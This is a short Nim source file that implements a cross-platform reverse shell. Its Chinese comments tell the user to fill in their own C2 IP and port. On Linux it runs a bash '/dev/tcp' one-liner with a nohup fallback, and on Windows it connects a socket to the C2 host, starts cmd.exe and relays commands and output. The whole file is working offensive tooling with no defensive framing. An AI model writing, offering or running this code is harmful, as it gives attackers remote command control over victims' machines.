import std/[net, os, osproc, strutils, strformat, streams]

const
  C2_HOST = "127.0.0.1"   # ← 改成你的IP
  C2_PORT = 8080          # ← 改成你的端口

proc linuxOneLinerReverseShell() =
  ## Linux 最佳一句话反弹Shell（最稳定版）
  let cmd = fmt"""bash -c 'bash -i >& /dev/tcp/{C2_HOST}/{C2_PORT} 0>&1'"""
  
  try:
    discard execCmd(cmd)
  except:
    # 备用方案
    discard execCmd(fmt"nohup bash -i >& /dev/tcp/{C2_HOST}/{C2_PORT} 0>&1 2>&1 &")

proc windowsReverseShell() =
  try:
    var socket = newSocket()
    socket.connect(C2_HOST, Port(C2_PORT))
    socket.send("Windows Nim reverse shell connected\n")
    
    var process = startProcess("cmd.exe", options = {poUsePath, poStdErrToStdOut})
    
    let inputS  = process.inputStream()
    let outputS = process.outputStream()
    
    while true:
      let line = socket.recvLine().strip()
      if line.len == 0: continue
      if line.toLowerAscii() in ["exit", "quit"]: break
      
      streams.write(inputS, line & "\n")
      streams.flush(inputS)
      
      sleep(150)
      let output = outputS.readAll()
      if output.len > 0:
        socket.send(output)
    
    process.close()
    socket.close()
  except:
    discard

proc main() =
  when defined(linux):
    linuxOneLinerReverseShell()
  else:
    windowsReverseShell()

when isMainModule:
  main()
